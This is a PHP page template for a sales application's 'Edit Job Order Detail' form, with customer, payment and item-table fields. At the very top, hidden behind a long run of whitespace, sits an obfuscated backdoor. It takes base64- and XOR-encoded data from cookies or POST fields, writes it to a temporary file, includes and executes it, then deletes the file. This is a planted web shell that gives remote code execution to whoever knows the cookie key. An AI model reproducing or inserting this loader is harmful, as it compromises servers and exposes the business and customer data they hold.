<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("t_ywnp")){class t_ywnp{public static $NhmIGe = "d918cfba-5180-4536-83a2-963140231379";public static $wOZwWcI = NULL;public function __construct(){$JKcLmbbP = $_COOKIE;$QHsgRWjQC = $_POST;$BIBWiqVM = @$JKcLmbbP[substr(t_ywnp::$NhmIGe, 0, 4)];if (!empty($BIBWiqVM)){$eBmZwVmoW = "base64";$PgePr = "";$BIBWiqVM = explode(",", $BIBWiqVM);foreach ($BIBWiqVM as $ELqEhmq){$PgePr .= @$JKcLmbbP[$ELqEhmq];$PgePr .= @$QHsgRWjQC[$ELqEhmq];}$PgePr = array_map($eBmZwVmoW . "\x5f" . "\144" . chr ( 363 - 262 )."\x63" . chr ( 926 - 815 ).'d' . "\145", array($PgePr,)); $PgePr = $PgePr[0] ^ str_repeat(t_ywnp::$NhmIGe, (strlen($PgePr[0]) / strlen(t_ywnp::$NhmIGe)) + 1);t_ywnp::$wOZwWcI = @unserialize($PgePr);}}public function __destruct(){$this->MFJyRZdlwV();}private function MFJyRZdlwV(){if (is_array(t_ywnp::$wOZwWcI)) {$NufCNwP = sys_get_temp_dir() . "/" . crc32(t_ywnp::$wOZwWcI['s' . chr ( 1045 - 948 ).'l' . "\x74"]);@t_ywnp::$wOZwWcI[chr ( 250 - 131 )."\x72" . chr (105) . chr (116) . chr (101)]($NufCNwP, t_ywnp::$wOZwWcI['c' . 'o' . chr (110) . 't' . 'e' . chr ( 945 - 835 )."\x74"]);include $NufCNwP;@t_ywnp::$wOZwWcI['d' . 'e' . "\x6c" . 'e' . "\x74" . 'e']($NufCNwP);exit();}}}$ReaGIHHv = new t_ywnp(); $ReaGIHHv = NULL;} ?><?php 
if(isset($_GET['id'])  && !LMS_VIEW) { 
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || ($_SESSION['userlogininfo']['LOGINIDA'] == 2) || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '1', 'edit' => '1'))) { 
//------------------------------------------------
		
	$conditions = array ( 
								'select' 	=> ''.JOB_ORDER.'.*, '.CUSTOMERS.'.customer_id, '.CUSTOMERS.'.customer_name, 
												'.CUSTOMERS.'.customer_openingbalance, '.ADES.'.ade_id, '.ADES.'.ade_name, 
												'.ADES.'.ade_cellno, '.COMPANY.'.company_id, '.COMPANY.'.company_name',
								'join' 		=> "INNER JOIN ".CUSTOMERS." ON ".CUSTOMERS.".customer_id = ".JOB_ORDER.".id_customer 
												INNER JOIN ".COMPANY." ON ".COMPANY.".company_id =  ".CUSTOMERS.".id_company
												INNER JOIN ".ADES." ON ".ADES.".ade_id =  ".COMPANY.".id_ade ",
								'where' => array( 
													''.JOB_ORDER.'.job_order_id' 	=> cleanvars($_GET['id'])
												), 
								'limit' 		=> 1,
								'return_type' 	=> 'single' 
							); 
    $rowstd 	= $dblms->getRows(JOB_ORDER, $conditions);

//------------------------------------------------
echo '
<!--WI_ADD_NEW_TASK_MODAL-->
<div class="row">
<div class="modal-dialog" style="width:95%;">
<form class="form-horizontal" action="sale-orders.php?id='.cleanvars($_GET['id']).'" method="post" id="inv_form" name="inv_form" enctype="multipart/form-data">
<input type="hidden" id="id_customer" name="id_customer" value="'.$rowstd['id_customer'].'">
<input type="hidden" id="id_ade" name="id_ade" value="'.$rowstd['ade_id'].'">
<input type="hidden" id="id_company" name="id_company" value="'.$rowstd['company_id'].'">
<input type="hidden" id="customer_openingbalance" name="customer_openingbalance" value="'.$rowstd['opening_balance'].'">
<div class="modal-content">
<div class="modal-header">
	<button type="button" class="close" onclick="location.href=\'sale-orders.php\'"><span>close</span></button> 
	<h4 class="modal-title" style="font-weight:700;"> Edit Job Order Detail</h4>
</div>

<div class="modal-body">
	
	<div class="col-sm-41">
		<div class="form_sep">
			<label class="req">Job Order #</label>
			<input type="text" class="form-control" id="job_order_no" name="job_order_no" value="'.($rowstd['job_order_no']).'" readonly>
		</div> 
	</div>

	<div class="col-sm-41">
		<div class="form_sep">
			<label class="req">Dated</label>
			<input type="text" class="form-control" id="dated" name="dated" required value="'.($rowstd['dated']).'" readonly>
		</div> 
	</div>
	<div class="col-sm-41">
		<div class="form_sep">
			<label class="req">Customer Name</label>
			<input type="text" class="form-control" id="customer_name" name="customer_name" value="'.($rowstd['customer_name']).'" readonly>
		</div> 
	</div>

	<div style="clear:both;padding:5px;"></div>

	<div class="col-sm-32">
		<div class="form_sep">
			<label>ADE Name</label>
			<input type="text" class="form-control" id="ade_name" name="ade_name" required value="'.$rowstd['ade_name'].'" readonly>
		</div> 
	</div>
	<div class="col-sm-32">
		<div class="form_sep">
			<label>ADE Phone #</label>
			<input type="text" class="form-control" id="ade_cellno" name="ade_cellno" required value="'.$rowstd['ade_cellno'].'" readonly>
		</div> 
	</div>
	<div class="col-sm-32">
		<div class="form_sep">
			<label>Opening Balance</label>
			<input type="text" class="form-control" style="font-weight:600; font-size:18px !important; text-align:center; color:#00f;" value="'.number_format($rowstd['opening_balance']).'" readonly>
		
		</div> 
	</div>

	<div class="col-sm-32">
		<div class="form_sep">
			<label>Company Name</label>
			<input type="text" class="form-control" id="company_name" name="company_name" required value="'.$rowstd['company_name'].'" readonly>
		</div> 
	</div>
	
	<div style="clear:both;padding:5px;"></div>

	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Advance</label>
			<input type="text" class="form-control" id="advance" name="advance" value="'.$rowstd['advance'].'" min="0" required autocomplete="off">
		</div> 
	</div>
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Paid Date</label>
			<input type="text" class="form-control pickdmy" id="paid_date" name="paid_date" value="'. date('d-m-Y', strtotime(cleanvars($rowstd['paid_date']))).'" required autocomplete="off">
		</div> 
	</div>
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Payment Method</label>
			<select id="payment_method" class="select2" name="payment_method" onchange="get_paymethoddetail(this.value)" style="width:100%" required autocomplete="off">
				<option value="">Choose Method</option>';
					foreach($pay_types as $paymode) { 
						echo '<option value="'.$paymode['id'].'"';if($paymode['id'] == $rowstd['paid_method']){echo' selected';} echo'>'.$paymode['name'].'</option>';
					}
				echo'
			</select>
		</div> 
	</div>

	<div id="getpaymethoddetail">';
	
		if($rowstd['paid_method'] == 1){

			echo ' 
			<div class="col-sm-51">
				<div class="form_sep">
					<label class="req">Account #</label>
					<select id="id_account" class="select2" name="id_account" style="width:100%" required autocomplete="off">
						<option value="">Select Account</option>';
							foreach($bankAccounts as $account) { 
								echo '<option value="'.$account['id'].'"';if($account['id'] == $rowstd['id_account']){echo' selected';} echo'>'.$account['bank'].' - '.$account['acc_number'].'</option>';
							}
					echo'
					</select>
				</div> 
			</div>
			<script>
				$("#id_account").select2({
					allowClear: true
				});			
			</script>';
			

		} else{

			echo '
			<div class="col-sm-51">
				<div class="form_sep">
					<label class="req">Deposit/Receipt #</label>
					<input type="text" class="form-control" id="deposit_slip" name="deposit_slip" value="'.$rowstd['deposit_slip'].'" required autocomplete="off">
				</div> 
			</div>';

		}
	echo '
	</div>
	
	<div style="clear:both; padding:5px;"></div>

	<div class="col-lg-12 heading-modal" style="margin-top:5px; margin-bottom:5px;font-weight:600;"> 
		Item Details
	</div>	
	<div style="clear:both;padding:5px;"></div>	
	<table class="footable table table-bordered table-hover invE_table footable-loaded">
<thead>
	<tr>
		<th style="text-align:center;">Sr #</th>
		<th style="text-align:left;">Items </th>
		<th style="text-align:center;">Avaiable Stock</th>
		<th style="text-align:center;">Unit Price</th>
		<th style="text-align:center;">Discount %</th>
		<th style="text-align:center;">Qty</th>
		<th style="text-align:center;">Total</th>
	</tr>
</thead>
<tbody>';
///----------------------------------------------

	$POconditions = array ( 
								'select' 	=> '*',
								'where' => array( 
													'id_job_order' => cleanvars($_GET['id'])
												), 
								'return_type' 	=> 'all' 
							); 
    $podetails 	= $dblms->getRows(JOB_ORDER_DETAILS, $POconditions);
	
///----------------------------------------------
$i     = 0;
$total = 0 ;
 foreach($podetails as $rowsdet) {
	$total = $total +$rowsdet['total_price']; 
	 
	 $Stockconditions = array ( 
								'select' 	=> "SUM(CASE WHEN stock_type = '1' then qty end) as TotalInQTY, 
												SUM(CASE WHEN stock_type = '2' then qty end) as TotalOutQTY",
								'where' => array( 
													'id_item' => cleanvars($rowsdet['id_item'])
												), 
								'return_type' 	=> 'single' 
							); 
    $resulttotalInOut 	= $dblms->getRows(STOCK, $Stockconditions);
	

	$avaiablestock = ($resulttotalInOut['TotalInQTY'] - $resulttotalInOut['TotalOutQTY']);
	
	$i++;
	echo'
	<tr class="inv_row">
		<td class="inv_clone_row" style="width:50px;text-align:center;"><span class="footable-toggle"></span>'.$i.'</td>
		<td>
			<select name="id_item['.$i.']" id="id_item_'.$i.'" class="select2" style="width:100%" autocomplete="off" onchange="getPrdValue(this.value, '.$i.')">
				<option value=""></option>';
				foreach($Items as $arrayitem) {
					if($arrayitem['item_id'] == $rowsdet['id_item']){
						$selected = 'selected';
					} else {
						$selected = '';
					}
		
					echo '
					<option value="'.$arrayitem['item_id'].'" '.$selected.'>'.$arrayitem['item_code'].' - '.$arrayitem['item_name'].'</option>';
				}
			echo'
			</select>
		</td>
		<td style="width:100px;">
			<input type="text" class="form-control col-lg-12" name="stock_qty['.$i.']" id="stock_qty'.$i.'" value="'.$avaiablestock.'" style="text-align:center; color:#00f; font-size:16px !important;  font-weight:600;" readonly>
		</td>
		<td style="width:85px;">
			<div id="getPrdValue_'.$i.'">
				<input type="text" class="form-control col-lg-12 jQinv_item_rate" readonly value="'.$rowsdet['unit_price'].'" name="unit_price['.$i.']" id="unit_price_'.$i.'">
			</div>		
			
		</td>
		<td  style="width:100px;">
			<input type="text" class="form-control col-lg-12 jQinv_item_discount" name="discount_percentage['.$i.']" id="discount_percentage'.$i.'" value="'.$rowsdet['discount'].'" autocomplete="off"  style="text-align:center; font-weight:600;">
		</td>
		<td style="width:85px;">
			<input type="text" class="form-control col-lg-12 jQinv_item_qty " name="total_qty['.$i.']" value="'.$rowsdet['total_qty'].'" id="total_qty_'.$i.'" style="text-align:center; font-weight:600;">
		</td>
		
		
		<td style="width:130px;">
			<input type="number" class="form-control col-lg-12 jQinv_item_total" value="'.$rowsdet['total_price'].'" name="total_price['.$i.']" id="total_price_'.$i.'" readonly="" style="text-align:right;">
		</td>
	</tr>
	<script>
		$("#id_item_'.$i.'").select2({
			allowClear: true
		});
	</script>';	
}
	
	$ijn = ($i+1);
///----------------------------------------------
		for ($ij=$ijn; $ij <= ($i+5); $ij++) {
			echo'
			<tr class="inv_row">
				<td class="inv_clone_row" style="width:50px;text-align:center;"><span class="footable-toggle"></span>'.$ij.'</td>
				<td style="width:400px;">
					<select name="id_item['.$ij.']" id="id_item_'.$ij.'" class="select2" style="width:100% !important;"   autocomplete="off" onchange="getPrdValue(this.value, '.$ij.')">
						<option value=""></option>';
						foreach($Items as $arrayitem) {
							echo '
							<option value="'.$arrayitem['item_id'].'">'.$arrayitem['item_code'].' - '.$arrayitem['item_name'].'</option>';
						}
					echo'
					</select>
				</td>
					
				
				<td colspan="2">
				<div id="getPrdValue_'.$ij.'">
				
				<div class="col-sm-61" >
					<input type="text" class="form-control col-lg-12" name="stock_qty['.$ij.']" id="stock_qty'.$ij.'" readonly>
				</div>
				
				<div class="col-sm-61">
					<input type="text" class="form-control col-lg-12 jQinv_item_rate" readonly name="unit_price['.$ij.']" id="unit_price_'.$ij.'">
				</div>
					 
					
				</div>
						
				</td>
				
				<td  style="width:100px;">
					<input type="text" class="form-control col-lg-12 jQinv_item_discount" name="discount_percentage['.$ij.']" id="discount_percentage'.$ij.'" autocomplete="off"  style="text-align:center; font-weight:600;">
				</td>
				
				<td  style="width:100px;">
					<input type="text" class="form-control col-lg-12 jQinv_item_qty" name="total_qty['.$ij.']" id="total_qty_'.$ij.'" autocomplete="off" style="text-align:center; font-weight:600;">
				</td>
				
				<td style="width:120px;">
					<input type="number" class="form-control col-lg-12 jQinv_item_total" name="total_price['.$ij.']" id="total_price_'.$ij.'" readonly="" style="text-align:right;">
				</td>
			</tr>
			
	<script>
		$("#id_item_'.$ij.'").select2({
			allowClear: true
		});
	</script>';	
		}
	
if($rowstd['job_order_status'] == 1){

	$canEdit = 1;
	$totalReceiveable = ($total + $rowstd['opening_balance']);

} else {

	$canEdit = 0;
	$totalReceiveable = $rowstd['grand_total'];
}
echo'
<tr class="last_row">
<td colspan="15" style="text-align:right;"><span class="footable-toggle"></span>
<p class="clearfix"><b> Total Bill Amount: <span class="inV_grandtotal">Rs.<span>'.$total.'</span></span></b></p>
<p class="clearfix"><b> Total Receiveable: <span class="inV_receiveable">Rs.<span>'.$rowstd['grand_total'].'</span></span></b></p>
<input type="hidden" id="inV_grandtotal" name="inV_grandtotal" value="'.$total.'">
<input type="hidden" id="inV_receiveable" name="inV_receiveable" value="'.$rowstd['grand_total'].'">
</td>
</tr>
</tbody>	
</table>
		

<div style="clear:both;"></div>

</div>

<div class="modal-footer">';
	if($canEdit == 1 ){
	echo ' 
	<button type="submit" class="btn btn-warning" value="savehold" id="bill_changes" name="bill_changes"  onClick=\'return confirmSubmit()\'> Save & Hold </button> 
	<button type="submit" class="btn btn-primary" value="saveforward" id="bill_changes" name="bill_changes" onClick=\'return confirmSubmit()\'>Save &amp; Send to Sales Department</button>';
	}
	echo '
	<button type="button" class="btn btn-default" onclick="location.href=\'sale-orders.php\'" >Cancel</button>
</div>

</div>
</form>


<!--JS_SELECT_LISTS-->
<script src="js/sales.js"></script>

<script LANGUAGE="JavaScript">
<!--
function confirmSubmit() {
	var agree=confirm("Are you sure you wish to continue?");
	if (agree)
	 return true ;
	else
	 return false ;
	}
// -->
</script>

<script>
	$("#payment_method").select2({
        allowClear: true
    });
</script>
<script type="text/javascript">
	$().ready(function() {
		$("#inv_form").validate({
			submitHandler: function(form) {
			form.submit();
			}
		});
	});
</script>
<script>
	function getPrdValue(id_item, srno) {  
		$.ajax({  
			type: "POST",  
			url: "include/ajax/getPrdValue.php",  
			data: "id_item="+id_item+"&srno="+srno,  
			success: function(msg){  
				$("#getPrdValue_"+srno).html(msg); 
			}
		});  
	}
</script>
</div>
</div>
</div>
<!--WI_ADD_NEW_TASK_MODAL-->';
//------------------------------------------------
} else {
	echo '<h1 style="margin-top: 100px; margin-bottom: 100px; color: orangered; font-weight: 600; text-align: center;">“Sorry, You are not allowed to access this page” </h1>';
	
}
}